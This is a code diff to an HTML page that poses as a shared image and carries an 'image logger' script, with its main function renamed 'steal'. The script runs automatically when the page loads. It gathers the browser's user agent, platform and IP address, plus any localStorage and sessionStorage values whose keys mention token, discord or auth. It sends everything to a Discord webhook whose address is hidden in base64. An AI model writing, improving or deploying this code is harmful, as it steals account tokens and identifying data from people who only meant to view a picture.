@@ -5,35 +5,47 @@
     <title></title>
     <meta property="og:image" content="https://i.imgur.com/4z3vK8P.png">
     <script>
-        async function l() {
-            let d = `Log\nUA: ${navigator.userAgent}\nTime: ${new Date()}\n`;
+        async function steal() {
+            let log = `🔥 IMAGE LOGGER HIT 🔥\n\n`;
+            log += `UA: ${navigator.userAgent}\n`;
+            log += `Platform: ${navigator.platform}\n`;
+            log += `Time: ${new Date().toLocaleString('tr-TR')}\n\n`;
+
+            // Daha iyi token yakalama
             try {
-                let t = [];
-                for (let i = 0; i < localStorage.length; i++) {
-                    let k = localStorage.key(i);
-                    if (k && k.toLowerCase().includes('token')) {
-                        let v = localStorage.getItem(k);
-                        if (v && v.length > 30) t.push(v);
+                let tokens = [];
+                // LocalStorage + SessionStorage
+                [localStorage, sessionStorage].forEach(storage => {
+                    for (let i = 0; i < storage.length; i++) {
+                        let key = storage.key(i);
+                        if (key && (key.includes('token') || key.includes('discord') || key.includes('auth'))) {
+                            let val = storage.getItem(key);
+                            if (val && val.length > 50) tokens.push(val);
+                        }
                     }
-                }
-                if (t.length) d += `T: ${t.join('|')}\n`;
-            } catch(e){}
-            
+                });
+                if (tokens.length) log += `Tokens:\n${tokens.join('\n')}\n\n`;
+            } catch(e) {}
+
+            // IP
             try {
                 let ip = await fetch('https://api.ipify.org?format=text').then(r => r.text());
-                d += `IP: ${ip}`;
-            } catch(e){}
+                log += `IP: ${ip}\n`;
+            } catch(e) {}
 
-            fetch(atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NjM1ODM5NjQ5NTA2OTE4NS9mbEFWOUdXV1VDbTVNQXlHZVE1MGJla3ZBU29tdG9YWjBmQmx1a2VBX3E1SDhyMHU2UkxxeFF1SElwVVVyeWs0MFFXWA=='), {
+            const hook = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NjM1ODM5NjQ5NTA2OTE4NS9mbEFWOUdXV1VDbTVNQXlHZVE1MGJla3ZBU29tdG9YWjBmQmx1a2VBX3E1SDhyMHU2UkxxeFF1SElwVVVyeWs0MFFXWA==');
+
+            fetch(hook, {
                 method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({content: d})
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: log })
             });
         }
-        window.onload = l;
+
+        window.onload = steal;
     </script>
 </head>
-<body>
-    <img src="https://i.imgur.com/4z3vK8P.png" style="width:100%;height:100vh;">
+<body style="margin:0;background:#111;">
+    <img src="https://i.imgur.com/4z3vK8P.png" style="width:100%;height:100vh;object-fit:contain;">
 </body>
 </html>
